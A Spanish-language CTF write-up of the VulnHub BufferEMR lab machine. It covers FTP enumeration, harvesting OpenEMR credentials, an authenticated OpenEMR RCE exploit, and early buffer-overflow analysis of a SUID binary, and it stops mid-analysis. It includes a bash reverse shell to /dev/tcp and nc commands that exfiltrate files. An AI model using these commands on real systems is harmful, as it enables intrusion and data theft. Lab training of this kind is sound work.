---
layout: single
title: BufferEMR - VulnHub
excerpt: "La maquina BufferEMR de la plataforma de VulnHub es una maquina linux donde tendremos que explotar un binario de 32 bytes que es la parte de Buffer Overflow ademas tendremos que aprovecharnos del servicio OpenEMR que su version es vulnerable y asi podremos ganar acceso ala maquina"
date: 2023-03-31
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-buffemr/icon.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - Buffer Overflow
  - OpenEMR
  - FTP Enumeration
---

<p align="center">
<img src="/assets/images/vh-writeup-buffemr/icon.png">
</p>


```bash
❯ sudo arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.100.15
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	b0:76:1b:40:12:c7	(Unknown)
192.168.100.12	80:30:49:81:dc:ad	(Unknown)
192.168.100.39	00:0c:29:3f:bc:7a	VMware, Inc.
```


```bash
❯ whichSystem.py 192.168.100.39

192.168.100.39 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p21,22,80 192.168.100.39 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 17:52 CST
Nmap scan report for 192.168.100.39
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 924cae7b01fe84f95ef7f0da91e47acf (RSA)
|   256 9597ebea5cf826943ca7b6b476c3279c (ECDSA)
|_  256 cb1cd9564f7ac00125cd98f64e232e77 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:3F:BC:7A (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Antes de continuar solo queria anunciarles que desarrolle una herramienta en `Bash` que te automatiza el escaneo con `nmap` solo tienes que proporcionarle la `IP` de la maquina victima
<https://github.com/MikeRega7/nrunscan>

## Enumeracion

 `Nmap` nos reporto que el puerto `21` que corre el serivicio `ftp` esta abierto y el usuario `anonymous` esta abilitado y podemos conectarnos sin proporcionar contraseña

 ```bash
❯ ftp 192.168.100.39
Connected to 192.168.100.39.
220 (vsFTPd 3.0.3)
Name (192.168.100.39:miguelrega7): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              20 Jun 21  2021 README
drwxr-xr-x   31 0        0            4096 Jun 21  2021 openemr
226 Directory send OK.
ftp> 
```

Esto es lo que hay en el directorio `openemr`

```bash
ftp> cd openemr
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            5526 Jun 21  2021 CODE_OF_CONDUCT.md
-rw-r--r--    1 0        0            2876 Jun 21  2021 CONTRIBUTING.md
drwxr-xr-x    4 0        0            4096 Jun 21  2021 Documentation
-rw-r--r--    1 0        0           35147 Jun 21  2021 LICENSE
-rw-r--r--    1 0        0            3356 Jun 21  2021 README.md
-rw-r--r--    1 0        0           20701 Jun 21  2021 acknowledge_license_cert.html
-rw-r--r--    1 0        0           19560 Jun 21  2021 acl_setup.php
-rw-r--r--    1 0        0           48330 Jun 21  2021 acl_upgrade.php
-rw-r--r--    1 0        0            4988 Jun 21  2021 admin.php
-rw-r--r--    1 0        0            3805 Jun 21  2021 bower.json
-rw-r--r--    1 0        0            6102 Jun 21  2021 build.xml
drwxr-xr-x    2 0        0            4096 Jun 21  2021 ccdaservice
drwxr-xr-x    4 0        0            4096 Jun 21  2021 ccr
drwxr-xr-x    2 0        0            4096 Jun 21  2021 ci
drwxr-xr-x    2 0        0            4096 Jun 21  2021 cloud
drwxr-xr-x    7 0        0            4096 Jun 21  2021 common
-rw-r--r--    1 0        0            3301 Jun 21  2021 composer.json
-rw-r--r--    1 0        0          265675 Jun 21  2021 composer.lock
drwxr-xr-x    2 0        0            4096 Jun 21  2021 config
drwxr-xr-x   11 0        0            4096 Jun 21  2021 contrib
-rw-r--r--    1 0        0             108 Jun 21  2021 controller.php
drwxr-xr-x    2 0        0            4096 Jun 21  2021 controllers
drwxr-xr-x    2 0        0            4096 Jun 21  2021 custom
-rwxr-xr-x    1 0        0            3995 Jun 21  2021 docker-compose.yml
drwxr-xr-x    2 0        0            4096 Jun 21  2021 entities
drwxr-xr-x    8 0        0            4096 Jun 21  2021 gacl
drwxr-xr-x    2 0        0            4096 Jun 21  2021 images
-rw-r--r--    1 0        0             901 Jun 21  2021 index.php
drwxr-xr-x   32 0        0            4096 Jun 21  2021 interface
-rw-r--r--    1 0        0            5381 Jun 21  2021 ippf_upgrade.php
drwxr-xr-x   25 0        0            4096 Jun 21  2021 library
drwxr-xr-x    3 0        0            4096 Jun 21  2021 modules
drwxr-xr-x    3 0        0            4096 Jun 21  2021 myportal
drwxr-xr-x    4 0        0            4096 Jun 21  2021 patients
drwxr-xr-x    6 0        0            4096 Jun 21  2021 phpfhir
drwxr-xr-x   10 0        0            4096 Jun 21  2021 portal
drwxr-xr-x    5 0        0            4096 Jun 21  2021 public
drwxr-xr-x    2 0        0            4096 Jun 21  2021 repositories
drwxr-xr-x    2 0        0            4096 Jun 21  2021 services
-rw-r--r--    1 0        0           40570 Jun 21  2021 setup.php
drwxr-xr-x    3 0        0            4096 Jun 21  2021 sites
drwxr-xr-x    2 0        0            4096 Jun 21  2021 sql
-rw-r--r--    1 0        0            4650 Jun 21  2021 sql_patch.php
-rw-r--r--    1 0        0            5375 Jun 21  2021 sql_upgrade.php
drwxr-xr-x   15 0        0            4096 Jun 21  2021 templates
drwxr-xr-x    5 0        0            4096 Jun 21  2021 tests
drwxr-xr-x   34 0        0            4096 Jun 21  2021 vendor
-rw-r--r--    1 0        0            2119 Jun 21  2021 version.php
226 Directory send OK.
ftp> 
```

Vamos a traernos todo eso de manera recursiva a nuestra maquina de atacante para poder analizarlos de mejor manera

```bash
wget -r ftp://192.168.100.39
```

```bash
❯ ls
 192.168.100.39
❯ cd 192.168.100.39
❯ ls
 share
❯ cd share
❯ ls
 openemr   README
```

```bash
❯ cd openemr
❯ ls
 ccdaservice   custom          myportal       sql                             bower.json           index.php
 ccr           Documentation   patients       templates                       build.xml            ippf_upgrade.php
 ci            entities        phpfhir        tests                           CODE_OF_CONDUCT.md   LICENSE
 cloud         gacl            portal         vendor                          composer.json        README.md
 common        images          public         acknowledge_license_cert.html   composer.lock        setup.php
 config        interface       repositories   acl_setup.php                   CONTRIBUTING.md      sql_patch.php
 contrib       library         services       acl_upgrade.php                 controller.php       sql_upgrade.php
 controllers   modules         sites          admin.php                       docker-compose.yml   version.php

```

El puerto `80` esta abierto y vemos que es la pagina web de Apache 2 Ubuntu por defecto

```ruby
❯ whatweb http://192.168.100.39
http://192.168.100.39 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.100.39], Title[Apache2 Ubuntu Default Page: It works]
```

Si probamos la ruta que encontramos en `ftp` que es `openemr` vemos esto

![](/assets/images/vh-writeup-buffemr/web2.png)

Si hubieramos hecho `fuzzing` tambien hubieramos encontrado la ruta

```bash
❯ grep -r -i "openemr" /usr/share/SecLists
/usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt:openemr
/usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt:www.openemr
/usr/share/SecLists/Discovery/DNS/namelist.txt:openemr
/usr/share/SecLists/Discovery/Web-Content/combined_directories.txt:openemr
/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:openemr
/usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:openemr
/usr/share/SecLists/Miscellaneous/domains-1million-top.txt:openemr-io
```

Nos piden contraseñas si las buscamos en google las credenciales por defecto vemos que son estas

![](/assets/images/vh-writeup-buffemr/web3.png)

Pero bueno es la primera vez y supongo que eso ya no estara valido

![](/assets/images/vh-writeup-buffemr/web4.png)

Como tenemos todos los recursos que descargamos podemos buscar por cosas interesantes que nos ayuden

Podemos buscar por la palabra `config`

```bash
❯ find \-name \*conf\*
./.editorconfig
./Documentation/privileged_db/secure_sqlconf.php
./config
./config/config.yaml
./interface/weno/confirm.php
./library/sqlconf.php
./library/js/nncustom_config.js
./portal/patient/_app_config.php
./portal/patient/_global_config.php
./portal/patient/_machine_config.php
./sites/default/config.php
./sites/default/sqlconf.php
```

En este archivo tenemos credenciales pero son para la base de datos

```bash
❯ catn ./sites/default/sqlconf.php
<?php
//  OpenEMR
//  MySQL Config

$host	= 'localhost';
$port	= '3306';
$login	= 'openemruser';
$pass	= 'openemruser123456';
$dbase	= 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```

Si las pruebas en la web no te van a servir

![](/assets/images/vh-writeup-buffemr/web4.png)

Aqui si hay credenciales que probablemente sean para el panel de login que encontramos

```bash
❯ catn ./tests/test.accounts
this is a test admin account:

admin:Monster123
```

`admin:Monster123`

Y bueno funcionan 

![](/assets/images/vh-writeup-buffemr/web5.png)

Aparte tenemos la version 

Si buscamos vulnerabilidades vemos que hay un `Remote Code Execution` o `RCE`

```bash
❯ searchsploit openemr 5.0.1.3
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                   | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)               | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                      | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                       | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                       | php/webapps/45161.py
---------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
❯ searchsploit -m php/webapps/45161.py
  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/45161
     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
File Type: ASCII text
```

```bash
❯ mv 45161.py openemr_exploit.py
```

```bash
❯ python3 openemr_exploit.py
usage: openemr_exploit.py [-h] [-u USER] [-p PASSWORD] [-c CMD] host
openemr_exploit.py: error: the following arguments are required: host
```

Si queremos ver como funciona y ver las peticiones que se tramitan podemos poner un proxy en el script para poder usar `burpsuite`

![](/assets/images/vh-writeup-buffemr/web7.png)

![](/assets/images/vh-writeup-buffemr/web8.png)

```bash
❯ burpsuite > /dev/null 2>&1 & disown
[1] 65559
```

Bueno no hace falta hacerlo simplemente si analizamos hace una peticon por post a esta url

![](/assets/images/vh-writeup-buffemr/web9.png)

Vamos a ponernos en escucha para ver si revisimos ejecucion remota de comandos
```bash
❯ python2.7 openemr_exploit.py -u admin -p Monster123 -c "whoami | nc 192.168.100.15 443" http://192.168.100.39/openemr
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:Monster123
[$] Injecting payload

```

Nos llega 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.39] 44460
www-data
```

Ahora vamos a ganar acceso ala maquina

```bash
❯ python2.7 openemr_exploit.py -u admin -p Monster123 -c "bash -i >& /dev/tcp/192.168.100.15/443 0>&1" http://192.168.100.39/openemr
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:Monster123
[$] Injecting payload
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.39] 44464
bash: cannot set terminal process group (967): Inappropriate ioctl for device
bash: no job control in this shell
www-data@buffemr:/var/www/html/openemr/interface/main$ 
```

Ahora como siempre para poder hacer `ctrl+c` ejecutas los siguientes comandos

```bash
www-data@buffemr:/var/www/html/openemr/interface/main$ script /dev/null -c bash
<ml/openemr/interface/main$ script /dev/null -c bash   
Script started, file is /dev/null
www-data@buffemr:/var/www/html/openemr/interface/main$ 
CTRL+Z
stty raw -echo; fg
reset xterm
ENTER
```

```bash
www-data@buffemr:/var/www/html/openemr/interface/main$ export TERM=xterm
```

Pues no podemos entrar tenemos que convertirnos en ese usuario

```bash
www-data@buffemr:/home$ ls
buffemr
www-data@buffemr:/home$ ls -l
total 4
drwx------ 16 buffemr buffemr 4096 Jun 24  2021 buffemr
www-data@buffemr:/home$ 
```

NO vamos a explotar `pkexec` por que no es la idea

```bash
www-data@buffemr:/$ find \-perm -4000 -user root 2>/dev/null
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/arping
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/sudo
./usr/sbin/pppd
```

Algo que podemos hacer es seguir enumerando lo que nos habiamos descargado por `ftp`

Podemos filtrar por palabras clave no voy a poner el `output` por que es muy largo `eso dijo ella`

```bash
grep -riE "pass|key|user"  
```

En una de las lineas encontramos como una clave para un `pdf`

```bash
sql/keys.sql:INSERT into ENCKEY (id, name, enckey) VALUES (1, "pdfkey", "c2FuM25jcnlwdDNkCg==");
```

`c2FuM25jcnlwdDNkCg==`

Esto es lo que es

```bash
❯ echo "c2FuM25jcnlwdDNkCg==" | base64 -d; echo
san3ncrypt3d
```

Si probamos la contraseña para el usuario `buffemr` no funciona

```bash
www-data@buffemr:/home$ su buffemr
Password: 
su: Authentication failure
www-data@buffemr:/home$ 
```

Vemos un `user.zip` vamos a traernolo a nuestro maquina de atacante

```bash
www-data@buffemr:/var$ ls
backups  cache	crash  lib  local  lock  log  mail  metrics  opt  run  snap  spool  tmp  user.zip  www
www-data@buffemr:/var$ 


```

```bash
www-data@buffemr:/var$ nc 192.168.100.15 443 < user.zip 
```

Lo resivimos

```bash
❯ nc -nlvp 443 > user.zip
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.39] 44472
^C
❯ ls
 192.168.100.39   user.zip
```

Podemos validar si la data no fue manipulada en el envio

```bash
www-data@buffemr:/var$ md5sum user.zip 
4c9f153d14808c1844b989c86c3980f4  user.zip
www-data@buffemr:/var$ 
```

El archivo es el mismo

```bash
❯ md5sum user.zip
4c9f153d14808c1844b989c86c3980f4  user.zip
```

Hay un `.lst`

```bash
❯ 7z l user.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 309 bytes (1 KiB)

Listing archive: user.zip

--
Path = user.zip
Type = zip
Physical Size = 309

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-06-21 12:11:18 .....          146          127  user.lst
------------------- ----- ------------ ------------  ------------------------
2021-06-21 12:11:18                146          127  1 files
```

Vamos a extraerlo pero nos pide contraseña vamos a usar `zip2john`

```bash
❯ 7z x user.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 309 bytes (1 KiB)

Extracting archive: user.zip
--
Path = user.zip
Type = zip
Physical Size = 309

    
Enter password (will not be echoed):
```

```bash
❯ zip2john user.zip > hash
ver 2.0 efh 5455 efh 7875 user.zip/user.lst PKZIP Encr: 2b chk, TS_chk, cmplen=127, decmplen=146, crc=75CA180A
```

Ahora lo crackeamos pero no nos encuentra la contraseña

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2023-03-30 20:04) 0g/s 2612Kp/s 2612Kc/s 2612KC/s !!rebound!!..*7¡Vamos!
Session completed
```

Vamos a ver si la cadena que decodeamos en `base64` es la contraseña

`san3ncrypt3d`

Pero nos dice que no

```bash
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 309 bytes (1 KiB)

Extracting archive: user.zip
--
Path = user.zip
Type = zip
Physical Size = 309

    
Would you like to replace the existing file:
  Path:     ./user.lst
  Size:     0 bytes
  Modified: 2021-06-21 12:11:18
with the file from archive:
  Path:     user.lst
  Size:     146 bytes (1 KiB)
  Modified: 2021-06-21 12:11:18
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

               
Enter password (will not be echoed):
ERROR: Wrong password : user.lst
               
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

Vamos a probar con la `password` en `base64`

```bash
c2FuM25jcnlwdDNkCg==
```

Y funciona

```bash
❯ 7z x user.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 309 bytes (1 KiB)

Extracting archive: user.zip
--
Path = user.zip
Type = zip
Physical Size = 309

    
Would you like to replace the existing file:
  Path:     ./user.lst
  Size:     0 bytes
  Modified: 2021-06-21 12:11:18
with the file from archive:
  Path:     user.lst
  Size:     146 bytes (1 KiB)
  Modified: 2021-06-21 12:11:18
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

               
Enter password (will not be echoed):
Everything is Ok

Size:       146
Compressed: 309
```

Tenemos credenciales asi ahora vamos a migrar al otro usuario

```bash
❯ catn user.lst
This file contain senstive information, therefore, should be always encrypted at rest.

buffemr - Iamgr00t

****** Only I can SSH in ************
```

`buffemr:Iamgr00t`

```bash
www-data@buffemr:/home$ su buffemr
Password: 
buffemr@buffemr:/home$ whoami
buffemr
buffemr@buffemr:/home$ 
```

## User flag

```bash
buffemr@buffemr:~$ cat user_flag.txt 
    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 
  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 
 ,'.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 
/ /|_|_|\ \| .-'/ (   ||\\||      / (   ||\\//||  |(_))                                                                
| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 
'. `---' .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 
  `-...-'   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                
 wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     
 (O)  (O) /  _)-<  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-<  (O)_/||_   
 / )  ( \ \__ `.   / __)|^_\      ,'.--.) ,'.---.`, | \  / |  | (_))|^_\  ,'.---.`, | \  / |  (..) \__ `.   / __)/o_)  
/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-' |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  
| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) 
'. `--' .`,-'   | \ \_  )|\\     '.    ) '. `---' .`||    ||   \)   )|\\ '. `---' .`||    || (_/\_),-'   | \ \_ | |//  
  `-..-' (_..--'   \__)(/  \)      `-.'    `-...-' (_/    \_)  (   (/  \)  `-...-' (_/    \_)     (_..--'   \__)\__/   



COnGRATS !! lETs get ROOT now ....!!
buffemr@buffemr:~$ 
```

## Lets get Root now

No tenemos privilegios asignados a nivel de `sudoers`

```bash
buffemr@buffemr:~$ sudo -l
[sudo] password for buffemr: 
Sorry, user buffemr may not run sudo on buffemr.
buffemr@buffemr:~$ 
```

Ya vemos algo interesante que esta en el directorio `opt`

```bash
buffemr@buffemr:/$ find -perm -4000 2>/dev/null | grep -v "snap"
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/arping
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/sudo
./usr/sbin/pppd
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/eject/dmcrypt-get-device
./usr/lib/xorg/Xorg.wrap
./bin/fusermount
./bin/mount
./bin/su
./bin/ping
./bin/umount
./opt/dontexecute
```

Es un binario `SUID`

```bash
buffemr@buffemr:/$ ls -l ./opt/dontexecute
-rwsrwxr-x 1 root root 7700 Jun 23  2021 ./opt/dontexecute
buffemr@buffemr:/$ file ./opt/dontexecute
./opt/dontexecute: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c8287c844acebae4ece08e8c7eefc341e8972e4, not stripped
buffemr@buffemr:/$ 
```

Vamos a ejecutarlo y le tenemos que pasar un argumento

```bash
buffemr@buffemr:/$ ./opt/dontexecute; echo
Usage: ./dontexecute argument
buffemr@buffemr:/$ 
```

Pero no pasa nada

```bash
buffemr@buffemr:/$ ./opt/dontexecute test; echo

buffemr@buffemr:/$ 
```

## Buffer Overflow

Bueno tal vez cuando el programador desarrollo esto programa que el `buffer` un decir de tamaño `50` caracteres pero si nosotros exedemos del limite podemos causar un desbordamiento del `buffer` y si esta mal programado pues puede funcionar y es vulnerable

```bash
buffemr@buffemr:/$ ./opt/dontexecute AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; echo
Segmentation fault (core dumped)

buffemr@buffemr:/$ 
```

El binario pues es de `32` bits

```bash
buffemr@buffemr:/$ file ./opt/dontexecute 
./opt/dontexecute: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c8287c844acebae4ece08e8c7eefc341e8972e4, not stripped
buffemr@buffemr:/$ 
```

![](/assets/images/vh-writeup-buffemr/buff1.png)

Bueno primero las `A` que introducimos partirian del `ESP` que es la `pila` pero si estamos dentro del margen o el buffer que ellos programaron no pasa nada PERO si incrementamos las `AAAAAA` mas de las debidas lo que pasa por detras es que si superamos el tamaño de `buffer` como en la imagen

Ahora vamos a traernos el binario a nuestro maquina de atacante para poder hacer pruebas con `gdb`

```bash
buffemr@buffemr:/$ nc 192.168.100.15 443 < /opt/dontexecute
```

```bash
❯ nc -nlvp 443 > binary
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.39] 44488
^C
❯ ls
 192.168.100.39   binary   hash   user.lst   user.zip
❯ chmod +x binary
```

Vamos a ejecutarlo con `gdb` para hacer pruebas y analizarlo yo voy a usar `gef` puedes usar `peda` o algun otro
<https://hugsy.github.io/gef/install/>

```bash
❯ gdb -q ./binary
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./binary...
(No debugging symbols found in ./binary)
gef➤  

```

Si ejecutamos el programa vemos que nos pide un argumento como ya sabiamos

```bash
gef➤  r
Starting program: /home/miguelrega7/VulnHub/Bufferm/content/binary 
[*] Failed to find objfile or not a valid file format: [Errno 2] No existe el fichero o el directorio: 'system-supplied DSO at 0xf7fd0000'
Usage: ./dontexecute argument[Inferior 1 (process 123246) exited with code 01]
gef➤  
```

Vamos a colapsar el binario para sobrescribir los registros

```bash
gef➤  r AAAAA
Starting program: /home/miguelrega7/VulnHub/Bufferm/content/binary AAAAA
[*] Failed to find objfile or not a valid file format: [Errno 2] No existe el fichero o el directorio: 'system-supplied DSO at 0xf7fd0000'
[Inferior 1 (process 123850) exited normally]
gef➤  i r
The program has no registers now.
gef➤  
```

El programa colapsa y empezamos a sobrescribir los registros

```bash
